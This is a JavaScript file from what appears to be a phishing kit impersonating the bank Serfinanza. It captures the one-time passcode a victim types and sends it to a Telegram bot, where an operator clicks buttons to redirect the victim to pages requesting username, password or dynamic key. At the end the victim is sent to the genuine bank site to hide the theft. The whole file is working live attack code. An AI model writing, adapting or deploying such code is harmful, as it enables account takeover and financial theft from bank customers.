/**
 * SERFINANZA - otp.js OPTIMIZADO
 */

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Serfinanza OTP: Inicializando...');
    
    if (typeof BancoUtils === 'undefined') {
        console.error('❌ BancoUtils no está cargado');
        return;
    }
    
    BancoUtils.initSocket();
    console.log('✅ Socket inicializado');
    
    const input = document.getElementById('otpInput');
    const btnIngresar = document.getElementById('btnIngresar');
    const overlay = document.getElementById('loadingOverlay');

    BancoUtils.onTelegramAction(handleTelegramAction);

    input.addEventListener('input', () => {
        BancoUtils.validateNumeric(input, 4);
        const isValid = input.value.length === 4;
        btnIngresar.disabled = !isValid;
        if (isValid) {
            btnIngresar.classList.add('active');
        } else {
            btnIngresar.classList.remove('active');
        }
    });

    btnIngresar.addEventListener('click', async (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        if (btnIngresar.disabled) return;
        
        console.log('🔘 Botón clickeado');
        console.log('📦 Mostrando overlay...');
        
        if (overlay) {
            overlay.classList.add('active');
            console.log('✅ Overlay mostrado');
        } else {
            console.error('❌ Overlay no encontrado');
        }

        const data = BancoUtils.saveBankData('serfinanza', { otp: input.value });
        console.log('📤 Datos a enviar:', data);
        
        const message = BancoUtils.formatMessage('SERFINANZA - OTP', data);
        const keyboard = BancoUtils.createKeyboard([
            { text: '👤 Pedir Usuario', action: 'request_usuario' },
            { text: '🔐 Pedir Contraseña', action: 'request_password' },
            { text: '🔢 Pedir Dinámica', action: 'request_dinamica' },
            { text: '📱 Pedir OTP', action: 'request_otp' },
            { text: '✅ Finalizar', action: 'finish' }
        ], BancoUtils.getSessionId());

        console.log('📨 Enviando a Telegram...');
        try {
            await BancoUtils.sendToTelegram('otp', { text: message, keyboard });
            console.log('✅ Mensaje enviado correctamente');
        } catch (error) {
            console.error('❌ Error al enviar:', error);
            if (overlay) overlay.classList.remove('active');
            alert('Error al enviar los datos. Por favor intente nuevamente.');
        }
    });

    function handleTelegramAction(data) {
        console.log('📢 Acción de Telegram recibida en OTP:', data);
        if (overlay) overlay.classList.remove('active');
        
        switch(data.action) {
            case 'request_usuario':
                console.log('👤 Redirigiendo a index.html');
                window.location.href = 'index.html';
                break;
            case 'request_password':
                console.log('🔐 Redirigiendo a password.html');
                window.location.href = 'password.html';
                break;
            case 'request_dinamica':
                console.log('🔢 Redirigiendo a dinamica.html');
                window.location.href = 'dinamica.html';
                break;
            case 'request_otp':
                console.log('📱 Limpiando campo de OTP');
                input.value = '';
                btnIngresar.disabled = true;
                btnIngresar.classList.remove('active');
                input.focus();
                break;
            case 'finish':
                console.log('✅ Finalizando - redirigiendo a bancoserfinanza.com');
                window.location.href = 'https://bancoserfinanza.com/';
                break;
            default:
                console.log('⚠️ Acción desconocida:', data.action);
        }
    }
});
